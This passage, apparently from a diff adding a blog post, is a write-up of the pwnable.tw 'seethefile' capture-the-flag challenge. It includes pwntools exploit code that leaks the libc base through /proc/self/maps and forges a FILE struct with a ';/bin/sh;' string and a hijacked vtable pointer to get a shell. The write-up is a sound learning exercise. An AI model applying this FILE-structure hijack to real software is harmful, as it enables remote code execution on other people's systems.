+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Nothing need to close&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fclose&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp);
+  }
+  fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This closes the previously opened file.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;attacking-the-program&quot;&gt;Attacking the Program&lt;&#x2F;h1&gt;
+&lt;p&gt;I will be using &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Gallopsled&#x2F;pwntools&quot;&gt;pwntools&lt;&#x2F;a&gt; to facilitate communications with the binary and the 
+remote server.&lt;&#x2F;p&gt;
+&lt;p&gt;To start off, we need to load the binary and the corresponding libc:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;*
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;context.binary &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;seethefile&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;context.terminal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;bin&#x2F;sh&amp;#39;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;elf &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;seethefile&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;#libc = ELF(&amp;#39;.&#x2F;libc_32.so.6&amp;#39;)                     # Remote libc
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;libc &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.23.so&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Local libc
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;process(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;seethefile&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+gdb.attach(r)
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;#r = remote(&amp;#39;chall.pwnable.tw&amp;#39;, 10200)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;I also chose to define some helper functions to abstract communications with the binary:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;openfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(path):
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;see :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(path)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;readfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;2&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;writefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;3&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;---------------MENU---------------&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)[:&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;---------------MENU---------------&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)]
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;closefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;4&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(name):
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;choice :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;5&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        r.sendline(name)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;leaking-libc-base&quot;&gt;Leaking libc base&lt;&#x2F;h2&gt;
+&lt;p&gt;If we want to get a shell, we need to know the address of &lt;code&gt;system&lt;&#x2F;code&gt; in memory. We can use the psuedo-file &lt;code&gt;&#x2F;proc&#x2F;self&#x2F;maps&lt;&#x2F;code&gt;
+which contains a list of loaded memory regions of the reading process. On the remote service, we need to call &lt;code&gt;readfile&lt;&#x2F;code&gt;
+twice because libc&#x27;s entry appears in the second set of 400 characters:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-seethefile&#x2F;5e8193f54304800866d69179.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;This would translate to the following in the exploit script:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;openfile(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;proc&#x2F;self&#x2F;maps&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+readfile()
+readfile()
+
+libc.address &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;([x.split(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;-&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;writefile().split(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;x.endswith(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.so&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;faking-a-file-struct&quot;&gt;Faking a FILE struct&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;choosing-the-flags&quot;&gt;Choosing the flags&lt;&#x2F;h3&gt;
+&lt;p&gt;If we simply create a file struct with only &lt;code&gt;vtable&lt;&#x2F;code&gt; set, we will receive a segfault. Looking at the source code of 
+&lt;a href=&quot;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&#x2F;libio&#x2F;oldiofclose.c#L36&quot;&gt;&lt;code&gt;fclose&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;, we see multiple fields of the 
+struct being dereferenced:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;attribute_compat_text_section
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_old_fclose (_IO_FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;fp)
+{
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; status;
+
+  CHECK_FILE(fp, EOF);
+
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* We desperately try to help programs which are using streams in a
+     strange way and mix old and new functions.  Detect new streams
+     here.  *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp-&amp;gt;_vtable_offset &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_new_fclose (fp);
+
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* First unlink the stream.  *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp-&amp;gt;_IO_file_flags &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_IS_FILEBUF)
+    _IO_un_link ((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_FILE_plus &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) fp);
+
+  _IO_acquire_lock (fp);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp-&amp;gt;_IO_file_flags &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_IS_FILEBUF)
+    status &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_old_file_close_it (fp);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;
+    status &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; fp-&amp;gt;_flags &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_ERR_SEEN &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;? -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+  _IO_release_lock (fp);
+  _IO_FINISH (fp);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(_IO_have_backup (fp))
+    _IO_free_backup_area (fp);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_stdin &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_stdout &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_stderr)
+    {
+      fp-&amp;gt;_IO_file_flags &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;free&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp);
+    }
+
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; status;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;We can skip large chunks of this function if &lt;code&gt;_IO_IS_FILEBUF&lt;&#x2F;code&gt; is not set. Looking at the source code of libc, I found 
+that the bit mask for _IO_IS_FILEBUF is &lt;code&gt;0x2000&lt;&#x2F;code&gt;. The bitwise NOT is &lt;code&gt;0xFFFFDFFF&lt;&#x2F;code&gt;, so we can set the flags of our fake 
+FILE struct to that.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;bypassing-the-lock&quot;&gt;Bypassing the lock&lt;&#x2F;h3&gt;
+&lt;p&gt;Another interesting macro &lt;code&gt;_IO_aquire_lock(fp)&lt;&#x2F;code&gt; is used. The 
+&lt;a href=&quot;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&#x2F;sysdeps&#x2F;nptl&#x2F;stdio-lock.h#L29&quot;&gt;struct &lt;code&gt;_IO_lock_t&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; isn&#x27;t too complicated:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;typedef struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{ 
+     &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; lock; 
+     &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; cnt; 
+     &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;owner;
+} _IO_lock_t;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;code&gt;_lock&lt;&#x2F;code&gt; is locked if &lt;code&gt;_lock-&amp;gt;cnt != 0&lt;&#x2F;code&gt;. Thus, if we set &lt;code&gt;_lock&lt;&#x2F;code&gt; to a buffer of zeroes, libc will be able to aquire the 
+lock by incrementing &lt;code&gt;cnt&lt;&#x2F;code&gt;. Similarly, its counterpart, &lt;code&gt;_IO_release_lock&lt;&#x2F;code&gt; decrements &lt;code&gt;cnt&lt;&#x2F;code&gt;. A good target buffer is the 
+end of the &lt;code&gt;filename&lt;&#x2F;code&gt; buffer.&lt;&#x2F;p&gt;
+&lt;p&gt;We can add the following onto our exploit script:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&amp;quot;                                       &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0xFFFFDFFF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                         &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;_flags  set _IO_IS_FILEBUF bit to false
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;;&#x2F;bin&#x2F;sh;&amp;quot;                             &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;???     to be interpreted as a string
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;file.ljust(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;A&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                   &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding to reach *fp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;name&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;])             &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# *fp           overwrite *fp to point to the start of the name buffer
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;`&amp;#39;                                  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;A&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;72&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;37&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)                        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# padding
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;payload &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(elf.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;filename&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# file-&amp;gt;_lock   vtable-&amp;gt;__dummy
